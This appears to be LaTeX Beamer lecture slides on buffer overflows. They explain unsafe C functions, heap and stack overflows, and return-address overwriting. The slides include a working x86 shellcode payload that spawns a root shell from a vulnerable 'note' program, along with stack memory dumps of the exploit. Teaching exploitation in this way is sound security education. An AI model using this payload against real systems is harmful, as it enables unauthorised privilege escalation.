\section{Buffer Overflows}
%\begin{frame}{Buffer Overflows}
%Bufferoverflow
%*Stack based / Heap based (just a slide)
%*EBP+4 (or RBP+8)
%*Unsafe functions (that ones which permit a buffer overrun)
%*(quick Example ?)
%\end{frame}

%\subsection{What is BOF?}
\begin{frame}[fragile,allowframebreaks]{What is BOF?}
	\begin{figure}
		\centering
		\includegraphics[height=.7\textheight]{imgs/segfault.png}
		\caption{BOF segmentation fault}
		\label{fig:segfault}
	\end{figure}
	\begin{block}{Also known as}
		\begin{verbatim}
			user$ ./note AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
			Segmentation fault
		\end{verbatim}
	\end{block}
\end{frame}
\begin{frame}[fragile,allowframebreaks]{How to use BOF?}
	\begin{figure}
		\centering
		\includegraphics[height=.7\textheight]{imgs/whoami.png}
		\caption{BOF whoami: root}
		\label{fig:whoami}
	\end{figure}
	\begin{block}{Also known as}
		\begin{verbatim}
			user$ ./note `perl -e 'printf("\x90" x 153 .
    "\x31\xdb\x31\xc9\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50
     \x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
     \x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xdb\xb0\x01
     \xcd\x80" . "\x90" x 22 . "\xef\xbe\xad\xde")'`
			sh-3.1# whoami
			root
		\end{verbatim}
	\end{block}
\end{frame}

\subsection{Unsafe functions}
\begin{frame}[fragile,allowframebreaks]{Unsafe functions}
\begin{block}{Unsafe C functions}
	\begin{itemize}
		\item \emph{gets()}: replace it with \emph{fgets()} or \emph{gets\_s()}
		\item \emph{strcpy()}: replace it with \emph{strncpy()} or \emph{strlcpy()}
		\item \emph{strcat()}: replace it with \emph{strncat()} or \emph{strlcat()}
		\item \emph{sprintf()}: replace it with \emph{snprintf()}
		\item \emph{printf()}: improper use of it can lead to exploitation, never call it with variable char* instead of constant char*.
	\end{itemize}
	Essentially, every C functions that don't check the size of the destination buffers
\end{block}
\end{frame}

\subsection{Basic Overflow}
\begin{frame}[fragile,allowframebreaks]{Basic Overflow}
	In the following example, a program has defined two data items which are adjacent in memory: an 8-byte-long string buffer, A, and a two-byte integer (short), B. Initially, A contains nothing but zero bytes, and B contains the number 1979. Characters are one byte wide.
	\ccode
	\begin{lstlisting}
	char A[8] = {0,0,0,0,0,0,0,0};
	short B = 1979;
	\end{lstlisting}
	\begin{figure}
		\centering
		\includegraphics[width=\textwidth]{imgs/initialAB.png}
		\caption{A and B variables initial state}
		\label{fig:initialAB}
	\end{figure}
\framebreak
	Now, the program attempts to store the null-terminated string "excessive" in the A buffer. "excessive" is 9 characters long, and A can take 8 characters. By failing to check the length of the string, it overwrites the value of B
	\ccode
	\begin{lstlisting}
	gets(A);
	\end{lstlisting}
	\begin{figure}
		\centering
		\includegraphics[width=\textwidth]{imgs/finalAB.png}
		\caption{A and B variables final state}
		\label{fig:finalAB}
	\end{figure}
\end{frame}

\subsection{Heap-based Overflow}
\begin{frame}[fragile,allowframebreaks]{Heap-based Overflow}
Buffer overflow in heap area.\\
\begin{columns}[T]
	\begin{column}{.47\textwidth}
%	\begin{block}{A quick look}
		%Heap overflows are exploitable in a different manner to that of stack-based overflows.\\
\begin{itemize}
\item By corrupting \emph{malloc-ed} chunks is possible to \underline{overwrite internal structures} \underline{such as linked list pointers}.\\
\item Canonical heap overflow overwrites dynamic memory allocation linkage (malloc meta data)
\item Uses the resulting pointer exchange to overwrite a program function pointer (maybe in stack).
\end{itemize}
%	\end{block}
	\end{column}
	\begin{column}{.5\textwidth}
		\includegraphics[width=\textwidth]{imgs/heap.png}
		\label{fig:heap}
	\end{column}
\end{columns}
\end{frame}

\subsection{Stack-based Overflow}
\begin{frame}[fragile,allowframebreaks]{Stack-based Overflow}
Buffer overflow on stack, like the Morris one..\\
we can:
\begin{itemize}
\item Overwrite local variables that are near a buffer in memory.
\item Overwrite the some function pointer, or exception handlers pointers which are subsequently executed.
\item Overwrite the \underline{return address in the stack frame}.\\ Once the function returns, execution will resume at the return address as specified by the attacker, usually a user input filled buffer.
	\end{itemize}

\framebreak

\begin{block}{BOF in theory: Recipe}
\begin{columns}[T]
	\begin{column}{.3\textwidth}
	\begin{itemize}
	\item Buffer on stack
	\item Not sufficiently input validation
	\item Goodwill
	\end{itemize}
    \end{column}
	\begin{column}{.7\textwidth}
	\begin{figure}
    \includegraphics[width=0.6\textwidth]{imgs/bof1.png}
    \label{fig:bof1}
    \caption{Stack frame before BOF}
    \end{figure}	
	\end{column}
\end{columns}	
\end{block}

\framebreak

\begin{block}{BOF in theory: Powning}
\begin{columns}[T]
	\begin{column}{.3\textwidth}
	\begin{itemize}
	\item The buffer is filled with a 
		  {\bf shellcode} and some padding
	\item Padding must be precise
	\item Return address is overwritten with 
	      the shellcode address (on stack)
	\end{itemize}
    \end{column}
	\begin{column}{.7\textwidth}
	\begin{figure}
    \includegraphics[width=0.6\textwidth]{imgs/bof2.png}
    \label{fig:bof2}
    \caption{Corrupted stack frame}
    \end{figure}	
	\end{column}
\end{columns}	
\end{block}

\framebreak

\begin{columns}[T]
	\begin{column}{.5\textwidth}
	\tiny\begin{block}{./note "This is my sixth note"}
	\tiny\begin{verbatim}
Memory: addNote(): 80484f9,
main(): 80484b4, buffer:bffff454,
n_ebp: bffff528, n_esp: bffff450,
m_ebp: bffff538, m_esp: bffff534
        address    hex val   string val
n_esp > bffff450:  bffff450  ?  ?  ?  P
buffer> bffff454:  73696854  s  i  h  T
        bffff458:  20736920     s  i   
        bffff45c:  7320796d  s     y  m
        bffff460:  68747869  h  t  x  i
        bffff464:  746f6e20  t  o  n   
        bffff468:  b7fc0065  ?  ?     e
        ...        ...       ...
        bffff510:  00000000           
        bffff514:  00000000           
endBuf> bffff518:  bffff538  ?  ?  ?  8
        bffff51c:  080487fb        ?  ?
        bffff520:  b7fcaffc  ?  ?  ?  ?
        bffff524:  0804a008        ?  
n_ebp > bffff528:  bffff538  ?  ?  ?  8
n_ret > bffff52c:  080484ee     ?  ?
        bffff530:  bffff709  ?  ?  ?  	
m_esp > bffff534:  b8000ce0  ?        ?
m_ebp > bffff538:  bffff598  ?  ?  ?  ?
m_ret > bffff53c:  b7eb4e14  ?  ?  N  
        bffff540:  00000002	       
	\end{verbatim}
	\end{block}
	\end{column}
	\begin{column}{.5\textwidth}
	\tiny\begin{block}{./note AAAAAAAAAAAAAAAA...}
	\tiny\begin{verbatim}
Memory: addNote(): 80484f9
main(): 80484b4, buffer:bffff314
n_ebp: bffff3e8, n_esp: bffff310
m_ebp: bffff3f8, m_esp: bffff3f4
        address    hex val	string val
n_esp > bffff310:  bffff310  ?  ?  ?  
buffer> bffff314:  41414141  A  A  A  A
        bffff318:  41414141  A  A  A  A
        bffff31c:  41414141  A  A  A  A
        bffff320:  41414141  A  A  A  A
        bffff324:  41414141  A  A  A  A
        bffff328:  41414141  A  A  A  A
        ...        ...       ...
        bffff3d0:  41414141  A  A  A  A
        bffff3d4:  41414141  A  A  A  A
endBuf> bffff3d8:  41414141  A  A  A  A
        bffff3dc:  41414141  A  A  A  A
        bffff3e0:  41414141  A  A  A  A
        bffff3e4:  0804a008        ?  
n_ebp > bffff3e8:  41414141  A  A  A  A
n_ret > bffff3ec:  41414141  A  A  A  A
        bffff3f0:  41414141  A  A  A  A
m_esp > bffff3f4:  41414141  A  A  A  A
m_ebp > bffff3f8:  41414141  A  A  A  A
m_ret > bffff3fc:  41414141  A  A  A  A
        bffff400:  41414141  A  A  A  A
Segmentation fault
	\end{verbatim}
	\end{block}
	\end{column}
\end{columns}
\framebreak
\tiny\begin{block}{Overwriting the return address}
	\begin{columns}[T]
	\begin{column}{.4\textwidth}
	\tiny\begin{verbatim}
Memory: addNote(): 80484f9,
main(): 80484b4, buffer:bffff384
n_ebp: bffff458, n_esp: bffff380
m_ebp: bffff468, m_esp: bffff464
        address    hex val   string val
n_esp > bffff380:  bffff380  ?  ?  ?  ?
buffer> bffff384:  90909090  ?  ?  ?  ?
        bffff388:  90909090  ?  ?  ?  ?
        ...        ...       ...
        bffff418:  90909090  ?  ?  ?  ?
        bffff41c:  31db3190  1  ?  1  ?
        bffff420:  b0c031c9  ?  ?  1  ?
        bffff424:  3180cdcb  1  ?  ?  ?
        bffff428:  2f6850c0  /  h  P  ?
        bffff42c:  6868732f  h  h  s  /
        bffff430:  6e69622f  n  i  b  /
        bffff434:  5350e389  S  P  ?  ?
        bffff438:  d231e189  ?  1  ?  ?
        bffff43c:  80cd0bb0  ?  ?     ?
	\end{verbatim}
	\end{column}
	\begin{column}{.4\textwidth}
	\tiny\begin{verbatim}
        bffff440:  01b0db31     ?  ?  1
        bffff444:  909080cd  ?  ?  ?  ?
endBuf> bffff448:  90909090  ?  ?  ?  ?
        bffff44c:  90909090  ?  ?  ?  ?
        bffff450:  90909090  ?  ?  ?  ?
        bffff454:  0804a008     ?  
n_ebp > bffff458:  90909090  ?  ?  ?  ?
n_ret > bffff45c:  bffff388  ?  ?  ?  ?
        bffff460:  bffff600  ?  ?  ?  
m_esp > bffff464:  b8000ce0  ?        ?
m_ebp > bffff468:  bffff4c8  ?  ?  ?  ?
m_ret > bffff46c:  b7eb4e14  ?  ?  N  
        bffff470:  00000002           
sh-3.1# whoami
root
sh-3.1# exit
	\end{verbatim}
	\end{column}
\end{columns}
	\end{block}
\end{frame}
